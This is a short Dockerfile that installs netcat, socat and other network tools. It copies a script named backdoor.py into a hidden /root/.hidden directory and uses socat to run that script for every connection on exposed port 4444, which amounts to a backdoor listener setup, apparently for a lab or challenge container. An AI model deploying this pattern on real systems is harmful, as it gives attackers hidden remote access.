FROM ubuntu:latest

# Update package list and install essential tools
RUN apt-get update && apt update && apt-get install -y --no-install-recommends \
    net-tools \
    netcat-traditional \
    curl \
    wget \
    socat \
    python3 \
    iputils-ping \
    vim \
    nano \
    && rm -rf /var/lib/apt/lists/*

# Set up the directory and copy files
RUN mkdir -p /root/.hidden
COPY backdoor.py /root/.hidden/

# Expose port 4444 for the container
EXPOSE 4444

# Command to run the script using socat on port 4444
CMD ["socat", "TCP-LISTEN:4444,fork,reuseaddr", "EXEC:/usr/bin/python3 /root/.hidden/backdoor.py"]
